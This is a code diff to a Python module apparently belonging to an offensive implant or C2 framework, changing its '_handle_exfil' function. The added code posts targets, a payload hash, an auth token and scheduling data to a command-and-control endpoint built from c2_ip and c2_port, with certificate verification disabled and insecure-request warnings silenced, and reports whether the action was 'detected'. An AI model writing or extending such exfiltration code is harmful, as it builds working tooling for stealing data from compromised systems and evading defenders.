@@ -6,6 +6,8 @@ Bridges the operator pipeline to execution modules.
 from __future__ import annotations
 import sys
 import time
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 from pathlib import Path
 from typing import Any
 
@@ -19,12 +21,26 @@ from entropy_capsule import EntropyCapsuleEngine
 from session_drift_monitor import SessionDriftMonitor
 
 def _handle_exfil(action_obj, mutation, c2_ip, c2_port):
+    import requests, uuid, os
     targets = action_obj.get("targets", [])
+    agent_id = os.environ.get("ZDS_AGENT_ID", str(uuid.uuid4())[:8])
+    token = os.environ.get("ZDS_AUTH_TOKEN", "")
+    endpoint = os.environ.get("ZDS_HTTPS_ENDPOINT", f"https://{c2_ip}:{c2_port}")
+    url = f"{endpoint}/data/{agent_id}"
+    payload = {
+        "targets": targets,
+        "payload_hash": mutation.payload_hash,
+        "personality": mutation.personality.value,
+        "noise": action_obj.get("noise"),
+        "schedule": action_obj.get("schedule"),
+        "token": token,
+    }
     try:
-        import covert_exfil
-        for target in targets:
-            covert_exfil.exfil_payload(c2_ip, c2_port, f"{target}:{mutation.payload_hash}")
-        return {"success": True, "detected": False, "channel": "HTTPS", "latency_ms": 120.0}
+        resp = requests.post(url, json=payload, verify=False, timeout=5)
+        if resp.status_code == 200:
+            return {"success": True, "detected": False, "channel": "HTTPS", "latency_ms": 120.0}
+        else:
+            return {"success": False, "detected": False, "channel": "HTTPS", "latency_ms": 0.0, "error": f"HTTP {resp.status_code}"}
     except Exception as e:
         return {"success": False, "detected": False, "channel": "HTTPS", "latency_ms": 0.0, "error": str(e)}
 
